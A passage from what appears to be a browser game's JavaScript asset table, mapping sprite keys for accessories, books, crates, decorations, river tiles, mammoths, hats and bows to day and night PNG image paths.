      ACCESSORY72D: "img/day-accessory71.png",
      ACCESSORY72N: "img/night-accessory71.png",
      ACCESSORY73D: "img/day-accessory72.png",
      ACCESSORY73N: "img/night-accessory72.png",
      ACCESSORY74D: "img/day-accessory73.png",
      ACCESSORY74N: "img/night-accessory73.png",
      ACCESSORY75D: "img/day-accessory74.png",
      ACCESSORY75N: "img/night-accessory74.png",
      ACCESSORY76D: "img/day-accessory75.png",
      ACCESSORY76N: "img/night-accessory75.png",
      ACCESSORY77D: "img/day-accessory76.png",
      ACCESSORY77N: "img/night-accessory76.png",
      ACCESSORY78D: "img/day-accessory77.png",
      ACCESSORY78N: "img/night-accessory77.png",
      ACCESSORY79D: "img/day-accessory78.png",
      ACCESSORY79N: "img/night-accessory78.png",
      ACCESSORY80D: "img/day-accessory79.png",
      ACCESSORY80N: "img/night-accessory79.png",
      ACCESSORY81D: "img/day-accessory80.png",
      ACCESSORY81N: "img/night-accessory80.png",
      ACCESSORY82D: "img/day-accessory81.png",
      ACCESSORY82N: "img/night-accessory81.png",
      BOOK0D: "img/day-book0.png",
      BOOK0N: "img/night-book0.png",
      BOOK1D: "img/day-book1.png",
      BOOK1N: "img/night-book1.png",
      BOOK2D: "img/day-book2.png",
      BOOK2N: "img/night-book2.png",
      BOOK3D: "img/day-book3.png",
      BOOK3N: "img/night-book3.png",
      BOOK4D: "img/day-book4.png",
      BOOK4N: "img/night-book4.png",
      BOOK5D: "img/day-book5.png",
      BOOK5N: "img/night-book5.png",
      BOOK6D: "img/day-book6.png",
      BOOK6N: "img/night-book6.png",
      BOOK7D: "img/day-book7.png",
      BOOK7N: "img/night-book7.png",
      BOOK8D: "img/day-book8.png",
      BOOK8N: "img/night-book8.png",
      BOOK9D: "img/day-book9.png",
      BOOK9N: "img/night-book9.png",
      BOOK10D: "img/day-book10.png",
      BOOK10N: "img/night-book10.png",
      BOOK11D: "img/day-book11.png",
      BOOK11N: "img/night-book11.png",
      BOOK12D: "img/day-book12.png",
      BOOK12N: "img/night-book12.png",
      BOOK13D: "img/day-book13.png",
      BOOK13N: "img/night-book13.png",
      BOOK14D: "img/day-book14.png",
      BOOK14N: "img/night-book14.png",
      BOOK15D: "img/day-book15.png",
      BOOK15N: "img/night-book15.png",
      BOOK16D: "img/day-book16.png",
      BOOK16N: "img/night-book16.png",
      BOOK17D: "img/day-book17.png",
      BOOK17N: "img/night-book17.png",
      BOOK18D: "img/day-book18.png",
      BOOK18N: "img/night-book18.png",
      BOOK19D: "img/day-book19.png",
      BOOK19N: "img/night-book19.png",
      BOOK20D: "img/day-book20.png",
      BOOK20N: "img/night-book20.png",
      BOOK21D: "img/day-book21.png",
      BOOK21N: "img/night-book21.png",
      BOOK22D: "img/day-book22.png",
      BOOK22N: "img/night-book22.png",
      BOOK23D: "img/day-book23.png",
      BOOK23N: "img/night-book23.png",
      BOOK24D: "img/day-book24.png",
      BOOK24N: "img/night-book24.png",
      BOOK25D: "img/day-book25.png",
      BOOK25N: "img/night-book25.png",
      BOOK26D: "img/day-book26.png",
      BOOK26N: "img/night-book26.png",
      BOOK27D: "img/day-book27.png",
      BOOK27N: "img/night-book27.png",
      BOOK28D: "img/day-book28.png",
      BOOK28N: "img/night-book28.png",
      BOOK29D: "img/day-book29.png",
      BOOK29N: "img/night-book29.png",
      BOOK30D: "img/day-book30.png",
      BOOK30N: "img/night-book30.png",
      BOOK31D: "img/day-book31.png",
      BOOK31N: "img/night-book31.png",
      BOOK32D: "img/day-book32.png",
      BOOK32N: "img/night-book32.png",
      BOOK33D: "img/day-book33.png",
      BOOK33N: "img/night-book33.png",
      BOOK34D: "img/day-book34.png",
      BOOK34N: "img/night-book34.png",
      BOOK35D: "img/day-book35.png",
      BOOK35N: "img/night-book35.png",
      BOOK36D: "img/day-book36.png",
      BOOK36N: "img/night-book36.png",
      BOOK37D: "img/day-book37.png",
      BOOK37N: "img/night-book37.png",
      BOOK38D: "img/day-book38.png",
      BOOK38N: "img/night-book38.png",
      BOOK39D: "img/day-book39.png",
      BOOK39N: "img/night-book39.png",
      BOOK40D: "img/day-book40.png",
      BOOK40N: "img/night-book40.png",
      BOOK41D: "img/day-book41.png",
      BOOK41N: "img/night-book41.png",
      BOOK42D: "img/day-book42.png",
      BOOK42N: "img/night-book42.png",
      BOOK43D: "img/day-book43.png",
      BOOK43N: "img/night-book43.png",
      BOOK44D: "img/day-book44.png",
      BOOK44N: "img/night-book44.png",
      BOOK45D: "img/day-book45.png",
      BOOK45N: "img/night-book45.png",
      CRATE1D: "img/day-crate1.png",
      CRATE1N: "img/night-crate1.png",
      CRATE2D: "img/day-crate2.png",
      CRATE2N: "img/night-crate2.png",
      CRATE3D: "img/day-crate3.png",
      CRATE3N: "img/night-crate3.png",
      CRATE4D: "img/day-crate4.png",
      CRATE4N: "img/night-crate4.png",
      CRATE5D: "img/day-crate5.png",
      CRATE5N: "img/night-crate5.png",
      CRATE6D: "img/day-crate6.png",
      CRATE6N: "img/night-crate6.png",
      CRATE7D: "img/day-crate7.png",
      CRATE7N: "img/night-crate7.png",
      CRATE8D: "img/day-crate8.png",
      CRATE8N: "img/night-crate8.png",
      CRATE9D: "img/day-crate9.png",
      CRATE9N: "img/night-crate9.png",
      CRATE10D: "img/day-crate10.png",
      CRATE10N: "img/night-crate10.png",
      CRATE11D: "img/day-crate11.png",
      CRATE11N: "img/night-crate11.png",
      CRATE12D: "img/day-crate12.png",
      CRATE12N: "img/night-crate12.png",
      CRATE13D: "img/day-crate13.png",
      CRATE13N: "img/night-crate13.png",
      CRATE14D: "img/day-crate14.png",
      CRATE14N: "img/night-crate14.png",
      CRATE15D: "img/day-crate15.png",
      CRATE15N: "img/night-crate15.png",
      CRATE16D: "img/day-crate16.png",
      CRATE16N: "img/night-crate16.png",
      CRATE17D: "img/day-crate17.png",
      CRATE17N: "img/night-crate17.png",
      CRATE18D: "img/day-crate18.png",
      CRATE18N: "img/night-crate18.png",
      CRATE19D: "img/day-crate19.png",
      CRATE19N: "img/night-crate19.png",
      CRATE20D: "img/day-crate20.png",
      CRATE20N: "img/night-crate20.png",
      CRATE21D: "img/day-crate21.png",
      CRATE21N: "img/night-crate21.png",
      CRATE22D: "img/day-crate22.png",
      CRATE22N: "img/night-crate22.png",
      CRATE23D: "img/day-crate23.png",
      CRATE23N: "img/night-crate23.png",
      CRATE24D: "img/day-crate24.png",
      CRATE24N: "img/night-crate24.png",
      CRATE25D: "img/day-crate25.png",
      CRATE25N: "img/night-crate25.png",
      CRATE26D: "img/day-crate26.png",
      CRATE26N: "img/night-crate26.png",
      CRATE27D: "img/day-crate27.png",
      CRATE27N: "img/night-crate27.png",
      CRATE28D: "img/day-crate28.png",
      CRATE28N: "img/night-crate28.png",
      CRATE29D: "img/day-crate29.png",
      CRATE29N: "img/night-crate29.png",
      CRATE30D: "img/day-crate30.png",
      CRATE30N: "img/night-crate30.png",
      CRATE31D: "img/day-crate31.png",
      CRATE31N: "img/night-crate31.png",
      CRATE32D: "img/day-crate32.png",
      CRATE32N: "img/night-crate32.png",
      CRATE33D: "img/day-crate33.png",
      CRATE33N: "img/night-crate33.png",
      CRATE34D: "img/day-crate34.png",
      CRATE34N: "img/night-crate34.png",
      CRATE35D: "img/day-crate35.png",
      CRATE35N: "img/night-crate35.png",
      CRATE36D: "img/day-crate36.png",
      CRATE36N: "img/night-crate36.png",
      CRATE37D: "img/day-crate37.png",
      CRATE37N: "img/night-crate37.png",
      CRATE38D: "img/day-crate38.png",
      CRATE38N: "img/night-crate38.png",
      CRATE39D: "img/day-crate39.png",
      CRATE39N: "img/night-crate39.png",
      CRATE40D: "img/day-crate40.png",
      CRATE40N: "img/night-crate40.png",
      CRATE41D: "img/day-crate41.png",
      CRATE41N: "img/night-crate41.png",
      CRATE42D: "img/day-crate42.png",
      CRATE42N: "img/night-crate42.png",
      CRATE43D: "img/day-crate43.png",
      CRATE43N: "img/night-crate43.png",
      CRATE44D: "img/day-crate44.png",
      CRATE44N: "img/night-crate44.png",
      CRATE45D: "img/day-crate45.png",
      CRATE45N: "img/night-crate45.png",
      CRATE46D: "img/day-crate46.png",
      CRATE46N: "img/night-crate46.png",
      CRATE47D: "img/day-crate47.png",
      CRATE47N: "img/night-crate47.png",
      CRATE48D: "img/day-crate48.png",
      CRATE48N: "img/night-crate48.png",
      CRATE49D: "img/day-crate49.png",
      CRATE49N: "img/night-crate49.png",
      CRATE50D: "img/day-crate50.png",
      CRATE50N: "img/night-crate50.png",
      CRATE51D: "img/day-crate51.png",
      CRATE51N: "img/night-crate51.png",
      CRATE52D: "img/day-crate52.png",
      CRATE52N: "img/night-crate52.png",
      CRATE53D: "img/day-crate53.png",
      CRATE53N: "img/night-crate53.png",
      CRATE54D: "img/day-crate54.png",
      CRATE54N: "img/night-crate54.png",
      CRATE55D: "img/day-crate55.png",
      CRATE55N: "img/night-crate55.png",
      CRATE56D: "img/day-crate56.png",
      CRATE56N: "img/night-crate56.png",
      CRATE57D: "img/day-crate57.png",
      CRATE57N: "img/night-crate57.png",
      CRATE58D: "img/day-crate58.png",
      CRATE58N: "img/night-crate58.png",
      CRATE59D: "img/day-crate59.png",
      CRATE59N: "img/night-crate59.png",
      CRATE60D: "img/day-crate60.png",
      CRATE60N: "img/night-crate60.png",
      CRATE61D: "img/day-crate61.png",
      CRATE61N: "img/night-crate61.png",
      CRATE62D: "img/day-crate62.png",
      CRATE62N: "img/night-crate62.png",
      CRATE63D: "img/day-crate63.png",
      CRATE63N: "img/night-crate63.png",
      CRATE64D: "img/day-crate64.png",
      CRATE64N: "img/night-crate64.png",
      CRATE65D: "img/day-crate65.png",
      CRATE65N: "img/night-crate65.png",
      CRATE66D: "img/day-crate66.png",
      CRATE66N: "img/night-crate66.png",
      CRATE67D: "img/day-crate67.png",
      CRATE67N: "img/night-crate67.png",
      CRATE68D: "img/day-crate68.png",
      CRATE68N: "img/night-crate68.png",
      CRATE69D: "img/day-crate69.png",
      CRATE69N: "img/night-crate69.png",
      CRATE70D: "img/day-crate70.png",
      CRATE70N: "img/night-crate70.png",
      CRATE71D: "img/day-crate71.png",
      CRATE71N: "img/night-crate71.png",
      CRATE72D: "img/day-crate72.png",
      CRATE72N: "img/night-crate72.png",
      DECORATION_0D: "img/day-herb0.png",
      DECORATION_1D: "img/day-herb1.png",
      DECORATION_2D: "img/day-herb2.png",
      DECORATION_3D: "img/day-herb3.png",
      DECORATION_4D: "img/day-herb4.png",
      DECORATION_5D: "img/day-herb5.png",
      DECORATION_6D: "img/day-herb6.png",
      DECORATION_7D: "img/day-herb7.png",
      DECORATION_8D: "img/day-herb8.png",
      DECORATION_9D: "img/day-herb9.png",
      DECORATION_10D: "img/day-herb10.png",
      DECORATION_11D: "img/day-herb11.png",
      DECORATION_12D: "img/day-herb12.png",
      DECORATION_13D: "img/day-herb13.png",
      DECORATION_14D: "img/day-herb14.png",
      DECORATION_15D: "img/day-herb15.png",
      DECORATION_16D: "img/day-shell0.png",
      DECORATION_17D: "img/day-shell1.png",
      DECORATION_18D: "img/day-shell2.png",
      DECORATION_19D: "img/day-leaf1.png",
      DECORATION_20D: "img/day-leaf2.png",
      DECORATION_21D: "img/day-leaf3.png",
      DECORATION_22D: "img/day-leaf4.png",
      DECORATION_23D: "img/day-leaf5.png",
      DECORATION_24D: "img/day-leaf6.png",
      DECORATION_25D: "img/day-leaf7.png",
      DECORATION_26D: "img/day-leaf8.png",
      DECORATION_27D: "img/day-rock0.png",
      DECORATION_28D: "img/day-rock1.png",
      DECORATION_29D: "img/day-rock2.png",
      DECORATION_30D: "img/day-rock3.png",
      DECORATION_31D: "img/day-rock4.png",
      DECORATION_32D: "img/day-rock5.png",
      DECORATION_33D: "img/day-rock6.png",
      DECORATION_34D: "img/day-rock7.png",
      DECORATION_35D: "img/day-rock8.png",
      DECORATION_36D: "img/day-rock9.png",
      DECORATION_37D: "img/day-rock10.png",
      DECORATION_38D: "img/day-rock11.png",
      DECORATION_39D: "img/day-rock12.png",
      DECORATION_40D: "img/day-rock13.png",
      DECORATION_41D: "img/day-flower1.png",
      DECORATION_42D: "img/day-flower2.png",
      DECORATION_43D: "img/day-flower3.png",
      DECORATION_44D: "img/day-flower4.png",
      DECORATION_45D: "img/day-flower5.png",
      DECORATION_46D: "img/day-flower6.png",
      DECORATION_47D: "img/day-flower7.png",
      DECORATION_48D: "img/day-flower8.png",
      DECORATION_49D: "img/day-flower9.png",
      DECORATION_50D: "img/day-herb16.png",
      DECORATION_51D: "img/day-herb17.png",
      DECORATION_52D: "img/day-herb18.png",
      DECORATION_53D: "img/day-herb19.png",
      DECORATION_54D: "img/day-herb20.png",
      DECORATION_55D: "img/day-herb21.png",
      DECORATION_0N: "img/night-herb0.png",
      DECORATION_1N: "img/night-herb1.png",
      DECORATION_2N: "img/night-herb2.png",
      DECORATION_3N: "img/night-herb3.png",
      DECORATION_4N: "img/night-herb4.png",
      DECORATION_5N: "img/night-herb5.png",
      DECORATION_6N: "img/night-herb6.png",
      DECORATION_7N: "img/night-herb7.png",
      DECORATION_8N: "img/night-herb8.png",
      DECORATION_9N: "img/night-herb9.png",
      DECORATION_10N: "img/night-herb10.png",
      DECORATION_11N: "img/night-herb11.png",
      DECORATION_12N: "img/night-herb12.png",
      DECORATION_13N: "img/night-herb13.png",
      DECORATION_14N: "img/night-herb14.png",
      DECORATION_15N: "img/night-herb15.png",
      DECORATION_16N: "img/night-shell0.png",
      DECORATION_17N: "img/night-shell1.png",
      DECORATION_18N: "img/night-shell2.png",
      DECORATION_19N: "img/night-leaf1.png",
      DECORATION_20N: "img/night-leaf2.png",
      DECORATION_21N: "img/night-leaf3.png",
      DECORATION_22N: "img/night-leaf4.png",
      DECORATION_23N: "img/night-leaf5.png",
      DECORATION_24N: "img/night-leaf6.png",
      DECORATION_25N: "img/night-leaf7.png",
      DECORATION_26N: "img/night-leaf8.png",
      DECORATION_27N: "img/night-rock0.png",
      DECORATION_28N: "img/night-rock1.png",
      DECORATION_29N: "img/night-rock2.png",
      DECORATION_30N: "img/night-rock3.png",
      DECORATION_31N: "img/night-rock4.png",
      DECORATION_32N: "img/night-rock5.png",
      DECORATION_33N: "img/night-rock6.png",
      DECORATION_34N: "img/night-rock7.png",
      DECORATION_35N: "img/night-rock8.png",
      DECORATION_36N: "img/night-rock9.png",
      DECORATION_37N: "img/night-rock10.png",
      DECORATION_38N: "img/night-rock11.png",
      DECORATION_39N: "img/night-rock12.png",
      DECORATION_40N: "img/night-rock13.png",
      DECORATION_41N: "img/night-flower1.png",
      DECORATION_42N: "img/night-flower2.png",
      DECORATION_43N: "img/night-flower3.png",
      DECORATION_44N: "img/night-flower4.png",
      DECORATION_45N: "img/night-flower5.png",
      DECORATION_46N: "img/night-flower6.png",
      DECORATION_47N: "img/night-flower7.png",
      DECORATION_48N: "img/night-flower8.png",
      DECORATION_49N: "img/night-flower9.png",
      DECORATION_50N: "img/night-herb16.png",
      DECORATION_51N: "img/night-herb17.png",
      DECORATION_52N: "img/night-herb18.png",
      DECORATION_53N: "img/night-herb19.png",
      DECORATION_54N: "img/night-herb20.png",
      DECORATION_55N: "img/night-herb21.png",
      DAY_RIVER_000_010_000: "img/day-river000-010-000.png",
      DAY_RIVER_000_010_010: "img/day-river000-010-010.png",
      DAY_RIVER_000_011_000: "img/day-river000-011-000.png",
      DAY_RIVER_000_011_010: "img/day-river000-011-010.png",
      DAY_RIVER_000_011_011: "img/day-river000-011-011.png",
      DAY_RIVER_000_110_000: "img/day-river000-110-000.png",
      DAY_RIVER_000_110_010: "img/day-river000-110-010.png",
      DAY_RIVER_000_110_110: "img/day-river000-110-110.png",
      DAY_RIVER_000_111_000: "img/day-river000-111-000.png",
      DAY_RIVER_000_111_010: "img/day-river000-111-010.png",
      DAY_RIVER_000_111_011: "img/day-river000-111-011.png",
      DAY_RIVER_000_111_110: "img/day-river000-111-110.png",
      DAY_RIVER_000_111_111: "img/day-river000-111-111.png",
      DAY_RIVER_010_010_000: "img/day-river010-010-000.png",
      DAY_RIVER_010_010_010: "img/day-river010-010-010.png",
      DAY_RIVER_010_011_000: "img/day-river010-011-000.png",
      DAY_RIVER_010_011_010: "img/day-river010-011-010.png",
      DAY_RIVER_010_011_011: "img/day-river010-011-011.png",
      DAY_RIVER_010_110_000: "img/day-river010-110-000.png",
      DAY_RIVER_010_110_010: "img/day-river010-110-010.png",
      DAY_RIVER_010_110_110: "img/day-river010-110-110.png",
      DAY_RIVER_010_111_000: "img/day-river010-111-000.png",
      DAY_RIVER_010_111_010: "img/day-river010-111-010.png",
      DAY_RIVER_010_111_011: "img/day-river010-111-011.png",
      DAY_RIVER_010_111_110: "img/day-river010-111-110.png",
      DAY_RIVER_010_111_111: "img/day-river010-111-111.png",
      DAY_RIVER_011_011_000: "img/day-river011-011-000.png",
      DAY_RIVER_011_011_010: "img/day-river011-011-010.png",
      DAY_RIVER_011_011_011: "img/day-river011-011-011.png",
      DAY_RIVER_011_111_000: "img/day-river011-111-000.png",
      DAY_RIVER_011_111_010: "img/day-river011-111-010.png",
      DAY_RIVER_011_111_011: "img/day-river011-111-011.png",
      DAY_RIVER_011_111_110: "img/day-river011-111-110.png",
      DAY_RIVER_011_111_111: "img/day-river011-111-111.png",
      DAY_RIVER_110_110_000: "img/day-river110-110-000.png",
      DAY_RIVER_110_110_010: "img/day-river110-110-010.png",
      DAY_RIVER_110_110_110: "img/day-river110-110-110.png",
      DAY_RIVER_110_111_000: "img/day-river110-111-000.png",
      DAY_RIVER_110_111_010: "img/day-river110-111-010.png",
      DAY_RIVER_110_111_011: "img/day-river110-111-011.png",
      DAY_RIVER_110_111_110: "img/day-river110-111-110.png",
      DAY_RIVER_110_111_111: "img/day-river110-111-111.png",
      DAY_RIVER_111_111_011: "img/day-river111-111-011.png",
      DAY_RIVER_111_111_110: "img/day-river111-111-110.png",
      DAY_RIVER_111_111_011: "img/day-river111-111-011.png",
      DAY_RIVER_111_111_000: "img/day-river111-111-000.png",
      DAY_RIVER_111_111_111: "img/day-river111-111-111.png",
      DAY_RIVER_111_111_010: "img/day-river111-111-010.png",
      NIGHT_RIVER_000_010_000: "img/night-river000-010-000.png",
      NIGHT_RIVER_000_010_010: "img/night-river000-010-010.png",
      NIGHT_RIVER_000_011_000: "img/night-river000-011-000.png",
      NIGHT_RIVER_000_011_010: "img/night-river000-011-010.png",
      NIGHT_RIVER_000_011_011: "img/night-river000-011-011.png",
      NIGHT_RIVER_000_110_000: "img/night-river000-110-000.png",
      NIGHT_RIVER_000_110_010: "img/night-river000-110-010.png",
      NIGHT_RIVER_000_110_110: "img/night-river000-110-110.png",
      NIGHT_RIVER_000_111_000: "img/night-river000-111-000.png",
      NIGHT_RIVER_000_111_010: "img/night-river000-111-010.png",
      NIGHT_RIVER_000_111_011: "img/night-river000-111-011.png",
      NIGHT_RIVER_000_111_110: "img/night-river000-111-110.png",
      NIGHT_RIVER_000_111_111: "img/night-river000-111-111.png",
      NIGHT_RIVER_010_010_000: "img/night-river010-010-000.png",
      NIGHT_RIVER_010_010_010: "img/night-river010-010-010.png",
      NIGHT_RIVER_010_011_000: "img/night-river010-011-000.png",
      NIGHT_RIVER_010_011_010: "img/night-river010-011-010.png",
      NIGHT_RIVER_010_011_011: "img/night-river010-011-011.png",
      NIGHT_RIVER_010_110_000: "img/night-river010-110-000.png",
      NIGHT_RIVER_010_110_010: "img/night-river010-110-010.png",
      NIGHT_RIVER_010_110_110: "img/night-river010-110-110.png",
      NIGHT_RIVER_010_111_000: "img/night-river010-111-000.png",
      NIGHT_RIVER_010_111_010: "img/night-river010-111-010.png",
      NIGHT_RIVER_010_111_011: "img/night-river010-111-011.png",
      NIGHT_RIVER_010_111_110: "img/night-river010-111-110.png",
      NIGHT_RIVER_010_111_111: "img/night-river010-111-111.png",
      NIGHT_RIVER_011_011_000: "img/night-river011-011-000.png",
      NIGHT_RIVER_011_011_010: "img/night-river011-011-010.png",
      NIGHT_RIVER_011_011_011: "img/night-river011-011-011.png",
      NIGHT_RIVER_011_111_000: "img/night-river011-111-000.png",
      NIGHT_RIVER_011_111_010: "img/night-river011-111-010.png",
      NIGHT_RIVER_011_111_011: "img/night-river011-111-011.png",
      NIGHT_RIVER_011_111_110: "img/night-river011-111-110.png",
      NIGHT_RIVER_011_111_111: "img/night-river011-111-111.png",
      NIGHT_RIVER_110_110_000: "img/night-river110-110-000.png",
      NIGHT_RIVER_110_110_010: "img/night-river110-110-010.png",
      NIGHT_RIVER_110_110_110: "img/night-river110-110-110.png",
      NIGHT_RIVER_110_111_000: "img/night-river110-111-000.png",
      NIGHT_RIVER_110_111_010: "img/night-river110-111-010.png",
      NIGHT_RIVER_110_111_011: "img/night-river110-111-011.png",
      NIGHT_RIVER_110_111_110: "img/night-river110-111-110.png",
      NIGHT_RIVER_110_111_111: "img/night-river110-111-111.png",
      NIGHT_RIVER_111_111_011: "img/night-river111-111-011.png",
      NIGHT_RIVER_111_111_110: "img/night-river111-111-110.png",
      NIGHT_RIVER_111_111_011: "img/night-river111-111-011.png",
      NIGHT_RIVER_111_111_000: "img/night-river111-111-000.png",
      NIGHT_RIVER_111_111_111: "img/night-river111-111-111.png",
      NIGHT_RIVER_111_111_010: "img/night-river111-111-010.png",
      DAY_RIVER_COMPO1: "img/day-pebblecompo1.png",
      DAY_RIVER_COMPO2: "img/day-pebblecompo2.png",
      DAY_RIVER_COMPO3: "img/day-pebblecompo3.png",
      DAY_RIVER_COMPO4: "img/day-pebblecompo4.png",
      DAY_RIVER_COMPO5: "img/day-pebblecompo5.png",
      DAY_RIVER_COMPO6: "img/day-pebblecompo6.png",
      DAY_RIVER_COMPO7: "img/day-pebblecompo7.png",
      DAY_RIVER_COMPO8: "img/day-pebblecompo8.png",
      DAY_RIVER_COMPO9: "img/day-pebblecompo9.png",
      DAY_RIVER_COMPO10: "img/day-pebblecompo10.png",
      DAY_RIVER_COMPO11: "img/day-pebblecompo11.png",
      DAY_RIVER_COMPO12: "img/day-pebblecompo12.png",
      DAY_RIVER_COMPO13: "img/day-pebblecompo13.png",
      DAY_RIVER_COMPO14: "img/day-pebblecompo14.png",
      DAY_RIVER_COMPO15: "img/day-pebblecompo15.png",
      DAY_RIVER_COMPO16: "img/day-pebblecompo16.png",
      DAY_RIVER_COMPO17: "img/day-pebblecompo17.png",
      DAY_RIVER_COMPO18: "img/day-pebblecompo18.png",
      DAY_RIVER_COMPO19: "img/day-pebblecompo19.png",
      DAY_RIVER_COMPO20: "img/day-pebblecompo20.png",
      DAY_RIVER_COMPO21: "img/day-pebblecompo21.png",
      DAY_RIVER_COMPO22: "img/day-pebblecompo22.png",
      DAY_RIVER_COMPO23: "img/day-pebblecompo23.png",
      DAY_RIVER_COMPO24: "img/day-pebblecompo24.png",
      DAY_RIVER_COMPO25: "img/day-pebblecompo25.png",
      DAY_RIVER_COMPO26: "img/day-pebblecompo26.png",
      DAY_RIVER_COMPO27: "img/day-pebblecompo27.png",
      DAY_RIVER_COMPO28: "img/day-pebblecompo28.png",
      NIGHT_RIVER_COMPO1: "img/night-pebblecompo1.png",
      NIGHT_RIVER_COMPO2: "img/night-pebblecompo2.png",
      NIGHT_RIVER_COMPO3: "img/night-pebblecompo3.png",
      NIGHT_RIVER_COMPO4: "img/night-pebblecompo4.png",
      NIGHT_RIVER_COMPO5: "img/night-pebblecompo5.png",
      NIGHT_RIVER_COMPO6: "img/night-pebblecompo6.png",
      NIGHT_RIVER_COMPO7: "img/night-pebblecompo7.png",
      NIGHT_RIVER_COMPO8: "img/night-pebblecompo8.png",
      NIGHT_RIVER_COMPO9: "img/night-pebblecompo9.png",
      NIGHT_RIVER_COMPO10: "img/night-pebblecompo10.png",
      NIGHT_RIVER_COMPO11: "img/night-pebblecompo11.png",
      NIGHT_RIVER_COMPO12: "img/night-pebblecompo12.png",
      NIGHT_RIVER_COMPO13: "img/night-pebblecompo13.png",
      NIGHT_RIVER_COMPO14: "img/night-pebblecompo14.png",
      NIGHT_RIVER_COMPO15: "img/night-pebblecompo15.png",
      NIGHT_RIVER_COMPO16: "img/night-pebblecompo16.png",
      NIGHT_RIVER_COMPO17: "img/night-pebblecompo17.png",
      NIGHT_RIVER_COMPO18: "img/night-pebblecompo18.png",
      NIGHT_RIVER_COMPO19: "img/night-pebblecompo19.png",
      NIGHT_RIVER_COMPO20: "img/night-pebblecompo20.png",
      NIGHT_RIVER_COMPO21: "img/night-pebblecompo21.png",
      NIGHT_RIVER_COMPO22: "img/night-pebblecompo22.png",
      NIGHT_RIVER_COMPO23: "img/night-pebblecompo23.png",
      NIGHT_RIVER_COMPO24: "img/night-pebblecompo24.png",
      NIGHT_RIVER_COMPO25: "img/night-pebblecompo25.png",
      NIGHT_RIVER_COMPO26: "img/night-pebblecompo26.png",
      NIGHT_RIVER_COMPO27: "img/night-pebblecompo27.png",
      NIGHT_RIVER_COMPO28: "img/night-pebblecompo28.png",
      BABY_MAMMOTHD: "img/day-baby-mammoth.png",
      BABY_MAMMOTH_TAMEDD: "img/day-baby-mammoth-tamed.png",
      BABY_MAMMOTH_ATTACKD: "img/day-baby-mammoth-angry.png",
      BABY_MAMMOTHN: "img/night-baby-mammoth.png",
      BABY_MAMMOTH_TAMEDN: "img/night-baby-mammoth-tamed.png",
      BABY_MAMMOTH_ATTACKN: "img/night-baby-mammoth-angry.png",
      INV_BABY_MAMMOTH_OUT: "img/inv-mammoth-out.png",
      INV_BABY_MAMMOTH_IN: "img/inv-mammoth-in.png",
      INV_BABY_MAMMOTH_CLICK: "img/inv-mammoth-click.png",
      HURT_BABY_MAMMOTH: "img/hurt-baby-mammoth.png",
      BABY_MAMMOTH_STEP: "img/baby-mammoth-step.png",
      FLOWER_HATD: "img/day-flower-hat.png",
      FLOWER_HATN: "img/night-flower-hat.png",
      INV_FLOWER_HAT_OUT: "img/inv-flower-hat-out.png",
      INV_FLOWER_HAT_IN: "img/inv-flower-hat-in.png",
      INV_FLOWER_HAT_CLICK: "img/inv-flower-hat-click.png",
      FUR_HATD: "img/day-fur-hat.png",
      FUR_HATN: "img/night-fur-hat.png",
      INV_FUR_HAT_OUT: "img/inv-fur-hat-out.png",
      INV_FUR_HAT_IN: "img/inv-fur-hat-in.png",
      INV_FUR_HAT_CLICK: "img/inv-fur-hat-click.png",
      MAMMOTHD: "img/day-mammoth.png",
      MAMMOTHN: "img/night-mammoth.png",
      HURT_MAMMOTH: "img/hurt-mammoth.png",
      INV_FUR_MAMMOTH_OUT: "img/inv-mammoth-fur-out.png",
      INV_FUR_MAMMOTH_IN: "img/inv-mammoth-fur-in.png",
      INV_FUR_MAMMOTH_CLICK: "img/inv-mammoth-fur-click.png",
      INV_WOOD_BOW_OUT: "img/inv-wood-bow-out.png",
      INV_WOOD_BOW_IN: "img/inv-wood-bow-in.png",
      INV_WOOD_BOW_CLICK: "img/inv-wood-bow-click.png",
      INV_WOOD_ARROW_OUT: "img/inv-wood-arrow-out.png",
      INV_WOOD_ARROW_IN: "img/inv-wood-arrow-in.png",
      INV_WOOD_ARROW_CLICK: "img/inv-wood-arrow-click.png",
      WOOD_BOWD: "img/day-wood-bow2.png",
      WOOD_BOWN: "img/night-wood-bow2.png",
      WOOD_ARROWD: "img/day-wood-arrow.png",
      WOOD_ARROWN: "img/night-wood-arrow.png",
      INV_STONE_BOW_OUT: "img/inv-stone-bow-out.png",
      INV_STONE_BOW_IN: "img/inv-stone-bow-in.png",
      INV_STONE_BOW_CLICK: "img/inv-stone-bow-click.png",
      INV_STONE_ARROW_OUT: "img/inv-stone-arrow-out.png",
      INV_STONE_ARROW_IN: "img/inv-stone-arrow-in.png",
      INV_STONE_ARROW_CLICK: "img/inv-stone-arrow-click.png",
      STONE_BOWD: "img/day-stone-bow.png",
      STONE_BOWN: "img/night-stone-bow.png",
      STONE_ARROWD: "img/day-stone-arrow.png",
      STONE_ARROWN: "img/night-stone-arrow.png",
      INV_GOLD_BOW_OUT: "img/inv-gold-bow-out.png",
      INV_GOLD_BOW_IN: "img/inv-gold-bow-in.png",
      INV_GOLD_BOW_CLICK: "img/inv-gold-bow-click.png",
      INV_GOLD_ARROW_OUT: "img/inv-gold-arrow-out.png",
      INV_GOLD_ARROW_IN: "img/inv-gold-arrow-in.png",
      INV_GOLD_ARROW_CLICK: "img/inv-gold-arrow-click.png",
      GOLD_BOWD: "img/day-gold-bow.png",
      GOLD_BOWN: "img/night-gold-bow.png",
      GOLD_ARROWD: "img/day-gold-arrow.png",
      GOLD_ARROWN: "img/night-gold-arrow.png",
      INV_DIAMOND_BOW_OUT: "img/inv-diamond-bow-out.png",
      INV_DIAMOND_BOW_IN: "img/inv-diamond-bow-in.png",
      INV_DIAMOND_BOW_CLICK: "img/inv-diamond-bow-click.png",
      INV_DIAMOND_ARROW_OUT: "img/inv-diamond-arrow-out.png",
      INV_DIAMOND_ARROW_IN: "img/inv-diamond-arrow-in.png",
      INV_DIAMOND_ARROW_CLICK: "img/inv-diamond-arrow-click.png",
      DIAMOND_BOWD: "img/day-diamond-bow.png",
      DIAMOND_BOWN: "img/night-diamond-bow.png",
      DIAMOND_ARROWD: "img/day-diamond-arrow.png",
      DIAMOND_ARROWN: "img/night-diamond-arrow.png",
      INV_AMETHYST_BOW_OUT: "img/inv-amethyst-bow-out.png",
      INV_AMETHYST_BOW_IN: "img/inv-amethyst-bow-in.png",
      INV_AMETHYST_BOW_CLICK: "img/inv-amethyst-bow-click.png",
      INV_AMETHYST_ARROW_OUT: "img/inv-amethyst-arrow-out.png",
      INV_AMETHYST_ARROW_IN: "img/inv-amethyst-arrow-in.png",
      INV_AMETHYST_ARROW_CLICK: "img/inv-amethyst-arrow-click.png",
      AMETHYST_BOWD: "img/day-amethyst-bow.png",
